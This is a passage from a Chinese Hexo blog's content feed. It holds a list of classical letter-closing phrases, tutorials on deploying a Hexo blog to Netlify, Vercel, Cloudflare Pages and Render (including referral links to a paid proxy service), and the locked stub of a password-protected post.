  <script id="hbeData" type="hbeData" data-hmacdigest="86e983752500a68f66e1166d3d56df215fa01ab9e1b167c3ed056e64117685c1"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">由于本文特殊性，请联系作者获取密码。</span>
      </label>
    </div>
  </div>
</div>
<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
<script data-swup-reload-script type="module">
import {initHBE} from "/js/plugins/hbe.js";
  console.log("hexo-blog-encrypt: loaded.");
    initHBE();
</script>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>逆向技术</tag>
        <tag>假条</tag>
        <tag>智慧曲园</tag>
      </tags>
  </entry>
  <entry>
    <title>传统书信里的绝美结束语</title>
    <url>/posts/ca57bca9.html</url>
    <content><![CDATA[<ol>
<li><p>楮墨有限，不尽欲言。</p>
<p>我的文化水平有限，想说的话没能全部表达出来。</p>
</li>
<li><p>情长纸短，不尽依依。</p>
<p>简短的信纸无法写完深长的情意，就不在尽述了。</p>
</li>
<li><p>多劳费心，至纫公谊。</p>
<p>往后辛苦您多费心了，深深感激你的情谊。</p>
</li>
<li><p>投笔伤情，临书惘惘。</p>
<p>暂且搁笔，看着写完的书信，心中十分怅惘。</p>
</li>
<li><p>春寒料峭，善自珍重。</p>
<p>天气虽暖还寒，尚望您自己多加保重。</p>
</li>
<li><p>兹际炎暑，希自珍卫。</p>
<p>现在正值炎夏酷热之际，希望您保重身体。</p>
</li>
<li><p>秋风萧萧，至祈摄卫。</p>
<p>秋天天气变凉，真挚的提醒您要保重身体。</p>
</li>
<li><p>渐入寒冬，伏惟珍重。</p>
<p>渐渐进入寒冷的冬天，希望您多多保重身体。</p>
</li>
<li><p>驰函寓意，伫望示复。</p>
<p>书信带走我的情意，时时盼望你的回信。</p>
</li>
<li><p>谨付寸心，希垂尺素。</p>
<p>我的真心尽在信中，期盼能得到您的回信。</p>
</li>
<li><p>拜书以闻，企盼还云。</p>
<p>我恭敬地写下这封信寄给您，翘首盼望您的回音。</p>
</li>
<li><p>谨遣数行，希还一字</p>
<p>我在信里给您写了这么多，还望您一定回信。</p>
</li>
<li><p>言不尽思，再祈珍重。</p>
<p>在信里写不完我的思念，再次希望您能珍重身体。</p>
</li>
<li><p>书未尽情，余候面叙。</p>
<p>用书信难以充分表达情意，等以后我们见面再说。</p>
</li>
<li><p>故特缕陈，诸希鉴宥。</p>
<p>我特意细细陈述，希望您察鉴原谅。</p>
</li>
<li><p>聊布往怀，君其详之。</p>
<p>这封信饱含我们往日情谊，请您仔细考虑这件事。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>文案</category>
        <category>优美句子</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>文案</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Hexo + GitHub + Netlify + Cloudflare提高博客的访问速度</title>
    <url>/posts/cb064b79.html</url>
    <content><![CDATA[<h1 id="使用-Hexo-GitHub-Netlify-Cloudflare-提高博客的访问速度"><a href="#使用-Hexo-GitHub-Netlify-Cloudflare-提高博客的访问速度" class="headerlink" title="使用 Hexo + GitHub + Netlify + Cloudflare 提高博客的访问速度"></a>使用 Hexo + GitHub + Netlify + Cloudflare 提高博客的访问速度</h1><p>今天也是看大佬的教程改了自己的配置发现访问速度确实快了许多，遂自己写一份教程加深一些理解。</p>
<blockquote>
<p>大佬的教程：<a class="link"   href="https://blog.grin.cool/blog/Hexo-blog#/" >https://blog.grin.cool/blog/Hexo-blog#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<blockquote>
<p>注意本教程不适合纯 Hexo 小白（其实只要略微了解过一丢丢 Hexo 的就能看懂这篇教程），适合前期有过 GitHub pages 建立经验的进阶用户</p>
<p>食用本教程若有进不去网站等情况请检查你的代理或者开魔法再进</p>
</blockquote>
<blockquote>
<p>食用本教程请确保</p>
<ol>
<li>使用过 Hexo 等博客框架，略微了解使用方法</li>
<li>了解 GitHub，Git 的一些基本操作</li>
<li>了解 <a class="link"   href="https://w1ndys.top/posts/fb3832f5.html" >《提问的智慧》<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 以及 <a class="link"   href="https://blog.arisa.moe/blog/2022/220428-how-to-ask-questions-like-a-retard/#/" >《如何像一个弱智一样提问》<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li>在没有错误日志下诊断问题无异于闭眼开车</li>
</ol>
</blockquote>
<p>首先，本教程相对于 GitHub pages 的优势</p>
<ol>
<li>本方法不再局限于只有一个仓库可以生成静态页面</li>
<li>国内访问速度飞快</li>
<li>每月有 100G 流量带宽额度，300 分钟的构建时间，对于个人博客记录来讲完全够用甚至还余下很多</li>
<li>静态页面生成速度高于 GitHub pages 至少一倍</li>
<li>Netlify 可以启用免费的 TLS 证书,启用 HTTPS</li>
</ol>
<br/>

<p>用久了 GitHub pages 发现，在国内的访问速度确实是有点慢，这是因为 GitHub pages 的服务器是在国外，所以在国内访问慢是正常的</p>
<p>这个方法 <span style="color:#FF0000;"> 不需要云服务器，不需要备案，全部免费 </span></p>
<p>也是看到了某大佬的博客才用这种方法 0 成本（时间成本不计入）提高博客访问速度</p>
<p>需要注意的是，本方法与原先的 GitHub pages 部署方法并不同</p>
<blockquote>
<p>GitHub pages 是本地编译然后把编译好的前端页面推送到 GitHub repo</p>
<p>这里采用的改进方法是直接把 Hexo 源码推送到 GitHub repo，用 Netlify 进行自动编译</p>
</blockquote>
<p>这里的好处就是</p>
<ol>
<li>不占用原来的 github.io 域名，也就是说这两个可以共存</li>
<li>源码直接在 GitHub repo 仓库里，不用担心数据丢失</li>
<li>如果换了电脑，可以直接从 GitHub 拉取源码在进行操作</li>
</ol>
<p>废话不多说直接开始操作</p>
<h2 id="准备魔法工具（如已有可绕过）"><a href="#准备魔法工具（如已有可绕过）" class="headerlink" title="准备魔法工具（如已有可绕过）"></a>准备魔法工具（如已有可绕过）</h2><h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h3><p><font color="#FF3333"> 这些你都不需要记，看看就行 </font></p>
<ul>
<li><p>虚拟专用网络(Virtual Private Network，VPN)是专用网络的延伸，它包含了类似 Internet 的共享或公共网络链接。通过 VPN 可以以模拟点对点专用链接的方式通过共享或公共网络在两台计算机之间发送数据。</p>
</li>
<li><p>如果说得再通俗一点，VPN 实际上是 “线路中的线路”，类型于城市大道上的 “公交专用线”，所不同的是，由 VPN 组成的 “线路” 并不是物理存在的，而是通过技术手段模拟出来，即是 “虚拟” 的。不过，这种虚拟的专用网络技术却可以在一条公用线路中为两台计算机建立一个逻辑上的专用 “通道”，它具有良好的保密和不受干扰性，使双方能进行自由而安全的点对点连接，因此被网络管理员们非常广泛地关注着。</p>
</li>
<li><p>通过虚拟专用网，我们在家就可以轻松安全的登录到公司的内部网络上，这样可以实现我们在家办公的梦想了。</p>
</li>
</ul>
<h3 id="账号注册"><a href="#账号注册" class="headerlink" title="账号注册"></a>账号注册</h3><p>有了这个工具，你不只是能进 ai，还可以高速浏览 GitHub 等网站，以及…………</p>
<p>点击下方任意链接跳转注册界面 ↓（有进不去的换一个）</p>
<p><span style="font-size:1.3em;"> <a class="link"   href="https://sakuracat.shop/user/#/register?code=Fo7cS2WA" >链接 1<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>          <a class="link"   href="https://sakuracat-cdn02.com/user/#/register?code=Fo7cS2WA" >链接 2<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>             <a class="link"   href="https://sakuracat-cdn01.com/user/#/register?code=Fo7cS2WA" >链接 3<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>          <a class="link"   href="https://sakuracat-004.com/user/#/register?code=Fo7cS2WA" >链接 4<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>          <a class="link"   href="https://sakuracat-003.com/user/#/register?code=Fo7cS2WA" >链接 5<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>         <a class="link"   href="https://sakuracat-b.com/user/#/register?code=Fo7cS2WA" >链接 6<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>          <a class="link"   href="https://sakuracat-a.com/user/#/register?code=Fo7cS2WA" >链接 7<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </span></p>
<p>输入邮箱密码注册账号，注册完成后登陆</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7.png"
                      alt="注册"
                ></p>
<p>然后点击左侧购买订阅</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E8%AE%A2%E9%98%85.png"
                      alt="订阅"
                ></p>
<p>根据需求选择你合适的方案，如果你只是想尝鲜的话，毫无疑问，选最便宜的，能用就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E8%B4%AD%E4%B9%B0%E8%AE%A2%E9%98%85.png"
                      alt="购买订阅"
                ></p>
<p>我本人用的是 <font color="#FF0000"> 38.8 巨量不限时，推荐这个 </font>，大约可以用 2 年左右，平均下来大约 0.6&#x2F;天，而且是实打实的买多少用多少，不会出现超时浪费</p>
<p>买完之后点击左上方仪表盘可以看到你的已订阅</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E4%BB%AA%E8%A1%A8%E7%9B%98.png"
                      alt="仪表盘"
                ></p>
<p>然后点击仪表盘下方的使用文档</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E5%AE%A2%E6%88%B7%E7%AB%AF.png"
                      alt="客户端安装"
                ></p>
<p>选择你的系统安装客户端</p>
<p>安装完之后登陆客户端就可以看到这样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E5%AE%89%E8%A3%85%E5%AE%8C%E6%88%90.png"
                      alt="安装完成"
                ></p>
<h3 id="连接节点"><a href="#连接节点" class="headerlink" title="连接节点"></a>连接节点</h3><p>目前为止已经基本结束了，点击连接，点进去选个绿色的节点，点全局，<font color="#FF0000"> 如果后续出现连接失败就换个节点 </font></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E8%8A%82%E7%82%B9.png"
                      alt="节点"
                ></p>
<h2 id="GitHub-操作"><a href="#GitHub-操作" class="headerlink" title="GitHub 操作"></a>GitHub 操作</h2><p>首先进入 <a class="link"   href="https://github.com/" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 建立一个空仓库</p>
<p>这里仓库名随便写就行，不再被 github.io 限制</p>
<p>我这里以 blog-Netlify-anzhiyu 为例，公有私有都行，你不想公开源码的话就私有</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/repo.png"
                     
                ></p>
<p>直接 git clone 刚刚那个 repo</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone 你的仓库地址</span><br></pre></td></tr></table></figure></div>

<p>然后在目录下初始化 Hexo，由于不是新手向教程，这里不过多赘述</p>
<blockquote>
<p>有关于 Hexo 的安装可以看这位大佬的博客 <a class="link"   href="https://akilar.top/posts/6ef63e2d/#/" >https://akilar.top/posts/6ef63e2d/#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<p>初始化完成之后，安装你想安装的 Hexo 主题，我这里以 anzhiyu 主题为例</p>
<p>下面是可供参考的 shell 脚本 <strong>一键安装 anzhiyu 主题.sh</strong></p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">printf &quot;\033[32mINFO \033[0m 正在安装主题...\n&quot;</span><br><span class="line">npm install Hexo-theme-anzhiyu</span><br><span class="line">printf &quot;\033[32mINFO \033[0m 主题安装完成\n&quot;</span><br><span class="line"></span><br><span class="line">printf &quot;\033[32mINFO \033[0m 正在安装依赖...\n&quot;</span><br><span class="line">npm install Hexo-renderer-pug Hexo-renderer-stylus --save</span><br><span class="line">printf &quot;\033[32mINFO \033[0m 依赖安装完成\n&quot;</span><br><span class="line"></span><br><span class="line">printf &quot;\033[32mINFO \033[0m 正在停顿10s可供查看情况！无异常可Ctrl+C退出\n&quot;</span><br><span class="line">sleep 10s</span><br></pre></td></tr></table></figure></div>

<p>主题安装完成后别忘了在你的_config.yml 文件里改掉主题，并且复制主题配置到博客根目录</p>
<blockquote>
<p>_config.anzhiyu.yml<br>_config.yml</p>
<p>就是这俩文件</p>
</blockquote>
<p>然后改一下 package.json 里面 script 的内容，涉及到后面的参数填写</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// package.json</span><br><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">  &quot;build&quot;: &quot;Hexo generate&quot;,</span><br><span class="line">  &quot;clean&quot;: &quot;Hexo clean&quot;,</span><br><span class="line">  &quot;server&quot;: &quot;Hexo server&quot;,</span><br><span class="line">  &quot;netlify&quot;: &quot;npm run clean &amp;&amp; npm run build&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后就可以推送到仓库了</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;deploy from Hexo-admin&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure></div>

<p>可以用 Hexo 命令在本地部署一下看看有没有 bug</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Hexo clean</span><br><span class="line">Hexo generate</span><br><span class="line">Hexo s</span><br></pre></td></tr></table></figure></div>

<p>刷新一下看看有没有推送上去</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124135839416.png"
                      alt="image-20240124135839416"
                ></p>
<p>至此 GitHub 上的操作就告一段落了，继续往下走</p>
<h2 id="Netlify-操作"><a href="#Netlify-操作" class="headerlink" title="Netlify 操作"></a>Netlify 操作</h2><p>来到 <a class="link"   href="https://app.netlify.com/" >Netlify 官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124135949377.png"
                      alt="image-20240124135949377"
                ></p>
<p>直接以 GitHub 注册便于导入仓库，然后点击继续，等待重定向</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124140145461.png"
                      alt="image-20240124140145461"
                ></p>
<p>然后点击左侧的 site，再点击 new site</p>
<p>然后点击 Import an existing project</p>
<p>然后 Deploywith GitHub</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124140316478.png"
                      alt="image-20240124140316478"
                ></p>
<p>然后找到刚刚创建的 repo</p>
<p>配置就按照我这个来写，注意分支，如果你是 master 填 master，如果你是 main 就填 main</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124140806592.png"
                      alt="image-20240124140806592"
                ></p>
<p>然后点击 deploy</p>
<p>创建完成之后就可以访问了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124140856386.png"
                      alt="image-20240124140856386"
                ></p>
<p>如果空白或者是啥也没有，请检查主题配置，一般是主题配置问题</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124142940466.png"
                      alt="image-20240124142940466"
                ></p>
<p>点击左侧的 domain 可以配置域名</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124143013535.png"
                      alt="image-20240124143013535"
                ></p>
<p>点击 add 可以添加自己的域名，点击右侧红框里可以自定义 Netlify 里的子域名</p>
<h2 id="配置域名以及-cloudflare-的-DNS-配置"><a href="#配置域名以及-cloudflare-的-DNS-配置" class="headerlink" title="配置域名以及 cloudflare 的 DNS 配置"></a>配置域名以及 cloudflare 的 DNS 配置</h2><p>从第四步开始就需要域名了，没有自己私人域名的可以不用看了</p>
<p>这里以阿里云域名控制台为例</p>
<p>首先进控制台 CNAME 指向 Netlify 的域名</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124143314135.png"
                      alt="image-20240124143314135"
                ></p>
<p>然后进入 <a class="link"   href="https://www.cloudflare-cn.com/" >cloudflare 官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124143802475.png"
                      alt="image-20240124143802475"
                ></p>
<p>添加站点，把你自己的域名填上，注意不要带 www.，填纯域名</p>
<p>比如 <a class="link"   href="http://www.w1ndys.top/" >www.w1ndys.top<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 只填 w1ndys.top 就可以</p>
<p>填写之后会看到让你改 DNS 服务器，我这里已经改过了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124144214920.png"
                      alt="image-20240124144214920"
                ></p>
<p>这里就去控制台把域名的 DNS 服务器改掉就可以了</p>
<p>修改之后会等待一段时间审查，一般十分钟左右，但不会超过 24 小时</p>
<p>审核完之后如图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124144042122.png"
                      alt="image-20240124144042122"
                ></p>
<p>然后我们进入到 DNS 记录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124144102621.png"
                      alt="image-20240124144102621"
                ></p>
<p>这里就根据你自己的域名，改成形如我这样的就可以了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Netlify/image-20240124144141785.png"
                      alt="image-20240124144141785"
                ></p>
<p>到这里已经结束了。</p>
<p>等待一段时间，访问你自己的域名试试</p>
<hr>
<p>如有疑问欢迎邮箱私信我 ： <a class="link"   href="mailto:&#119;&#x31;&#x6e;&#x64;&#x79;&#115;&#x40;&#111;&#117;&#116;&#108;&#x6f;&#111;&#x6b;&#x2e;&#x63;&#x6f;&#x6d;" >&#119;&#x31;&#x6e;&#x64;&#x79;&#115;&#x40;&#111;&#117;&#116;&#108;&#x6f;&#111;&#x6b;&#x2e;&#x63;&#x6f;&#x6d;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Github</tag>
        <tag>Hexo</tag>
        <tag>Netlify</tag>
        <tag>Cloudflare</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Netlify，cloudflare pages，GitHub pages , Vercel , Render部署你的 Hexo</title>
    <url>/posts/fbbdb8eb.html</url>
    <content><![CDATA[<h1 id="使用-Netlify，cloudflare-pages，GitHub-pages-Vercel-Render部署你的-Hexo"><a href="#使用-Netlify，cloudflare-pages，GitHub-pages-Vercel-Render部署你的-Hexo" class="headerlink" title="使用 Netlify，cloudflare pages，GitHub pages , Vercel, Render部署你的 Hexo"></a>使用 Netlify，cloudflare pages，GitHub pages , Vercel, Render部署你的 Hexo</h1><p>Hexo 博客，在我从一开始的 GitHub pages 转到 Netlify，如今又搭建了 cloudflare，但万变不离其宗，我们没有服务器，没有经济实力支持服务器，于是选择静态部署平台，pages 给我们提供了很好的平台途径，我也是踩了不少的坑，下面将从 Netlify，cloudflare 讲解如何部署。</p>
<p>首先说明一下用这个方法的好处：</p>
<ol>
<li>Hexo 源码基于 Github 仓库构建</li>
<li>源码文件全部云端存储</li>
<li>多设备无缝衔接同步编辑</li>
<li>四端站点，择优部署</li>
<li>部署方法基本一致，一通三通</li>
</ol>
<blockquote>
<p>前排提醒</p>
<ol>
<li>本教程适合有 Hexo 搭建基础搭建经验的大佬</li>
<li>本教程适合有 GitHub 仓库创建经验的大佬</li>
<li>本教程适合知道如何解决 GitHub 仓库连接问题的大佬（科学上网）</li>
<li>本教程适合有耐心，知道看完文档再问问题的用户</li>
<li>如果没了解过 Hexo，没有搭建经验，请移步糖果屋大佬的 <a class="link"   href="https://akilar.top/posts/6ef63e2d/#/" >Hexo 部署教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ol>
</blockquote>
<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>首先在 GitHub 开一个 repo，用来存放你的 Hexo 源码，名字随便填（即有_config.yml 文件的目录内所有文件）</p>
<p>比如我的（<a class="link"   href="https://github.com/W1ndys/blog.w1ndys.top#/" >已开源<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240301220924303.png"
                      alt="image-20240301220924303"
                ></p>
<h2 id="GitHub-pages"><a href="#GitHub-pages" class="headerlink" title="GitHub pages"></a>GitHub pages</h2><p>这个我就不提了，用过 Hexo 的基本都是从 GitHub pages 起步的</p>
<h2 id="如何在-Vercel-部署"><a href="#如何在-Vercel-部署" class="headerlink" title="如何在 Vercel 部署"></a>如何在 Vercel 部署</h2><p>进入 <a class="link"   href="https://vercel.com/" >Vercel 官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<blockquote>
<p>如果进不去，请用魔法</p>
</blockquote>
<p>用 Github 登陆</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314203301704.png"
                      alt="image-20240314203301704"
                ></p>
<p>点击 new project</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314203435601.png"
                      alt="image-20240314203435601"
                ></p>
<p>选择你的 Github 存储库，点击 import 导入</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314203512882.png"
                      alt="image-20240314203512882"
                ></p>
<p>Vercel 给出了 Hexo 模板，直接默认即可，点击 deploy</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314203531696.png"
                      alt="image-20240314203531696"
                ></p>
<p>等待部署完毕即可，这里可以看日志，部署完毕之后就会自动跳转，一般日志里出现绿色的 <code>info</code> 就基本没什么问题了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314203625589.png"
                      alt="image-20240314203625589"
                ></p>
<p>成功之后会出现庆祝特效，点击去面板</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314203730882.png"
                      alt="image-20240314203730882"
                ></p>
<p>三个按钮</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314203827478.png"
                      alt="image-20240314203827478"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314203907253.png"
                      alt="image-20240314203907253"
                ></p>
<p>之后点击 add 添加域名</p>
<p>在你的域名后台添加 CNAME 记录，记录值为 name-china.vercel-dns.com</p>
<p>等待部署即可</p>
<h2 id="如何在-Netlify-部署"><a href="#如何在-Netlify-部署" class="headerlink" title="如何在 Netlify 部署"></a>如何在 Netlify 部署</h2><p>进入 <a class="link"   href="https://www.netlify.com/" >Netlify 官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>点击中间的 <code>Deploy to Netlify</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240301221044762.png"
                      alt="image-20240301221044762"
                ></p>
<p>选择 <code>用GitHub登陆</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240301221701796.png"
                      alt="image-20240301221701796"
                ></p>
<p>授权之后找到 <code>添加新站点</code>，再点击 <code>导入存在的项目</code> 由于这里我已经添加过了，界面可能和你的不一样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240301221853520.png"
                      alt="image-20240301221853520"
                ></p>
<p>选择 GitHub</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240301221931687.png"
                      alt="image-20240301221931687"
                ></p>
<p>选择你的 repo，这里以我的为例</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240301222108288.png"
                      alt="image-20240301222108288"
                ></p>
<p>下面按照我的参数填</p>
<ul>
<li><code>site name</code> 填你的站点地址，假设你填了 xxx，你的站点就是 <strong>xxx.netlify.app</strong></li>
<li><code>branch to deploy</code> 就是你的 Github 分支，一般默认是 <strong>main</strong></li>
<li><code>base directory</code> 空着</li>
<li><code>build command</code> 填 <strong>默认（npm run build）</strong> 的就可以，不要修改</li>
<li><code>publish directory</code> 同上（<strong>public</strong>）</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314195457434.png"
                      alt="image-20240314195457434"
                ></p>
<p>完成之后点击绿色的按钮 <strong>deploy</strong></p>
<p>等待 <strong>building</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240301223052503.png"
                      alt="image-20240301223052503"
                ></p>
<p>状态为 <code>published</code> 之后就部署完成了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240301223157065.png"
                      alt="image-20240301223157065"
                ></p>
<p>点进去看一下，如果你的博客资源比较多的话，首次加载可能比较慢，此处可以挂个科学上网</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314200619757.png"
                      alt="image-20240314200619757"
                ></p>
<h2 id="如何在-cloudflare-上部署"><a href="#如何在-cloudflare-上部署" class="headerlink" title="如何在 cloudflare 上部署"></a>如何在 cloudflare 上部署</h2><p>进入 <a class="link"   href="https://www.cloudflare-cn.com/" >cloudflare pages 官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>右上角登陆，登陆之后</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314204646257.png"
                      alt="image-20240314204646257"
                ></p>
<p>点击左侧的 pages，然后点击 <code>创建应用程序</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314204845021.png"
                      alt="image-20240314204845021"
                ></p>
<p>点击 pages，然后连接到 Git，选择你的 Github 仓库</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/mirror/image-20240314204940289.png"
                      alt="image-20240314204940289"
                ></p>
<p><code>项目名称</code> 自定义</p>
<p><code>构建命令</code>：npm run build</p>
<p><code>输出目录</code>：public</p>
<p>点击构建等待构建即可，步骤与前两个基本类似</p>
<p>当然这个也支持自定义域名</p>
<h2 id="如何在-Render-上部署"><a href="#如何在-Render-上部署" class="headerlink" title="如何在 Render 上部署"></a>如何在 Render 上部署</h2><p>这里先不写了，基本都是一个样的跟之前的</p>
<p>Render 官网：<a class="link"   href="https://dashboard.render.com/" >https://dashboard.render.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<hr>
<p>现在你有四个博客站点了，可以设置一个主站，另外俩当做镜像站</p>
<p>比如我的</p>
<ul>
<li>主站：<a href="https://blog.w1ndys.top/">https://blog.w1ndys.top/</a></li>
<li>Vercel 镜像站：<a class="link"   href="https://v.blog.w1ndys.top/" >https://v.blog.w1ndys.top/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li>Netlify 镜像站：<a class="link"   href="https://n.blog.w1ndys.top/" >https://n.blog.w1ndys.top/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li>cloudflare 镜像站：<a class="link"   href="https://c.blog.w1ndys.top/" >https://c.blog.w1ndys.top/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li>Render 镜像站：<a class="link"   href="https://r.blog.w1ndys.top/" >https://r.blog.w1ndys.top/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Vercel</tag>
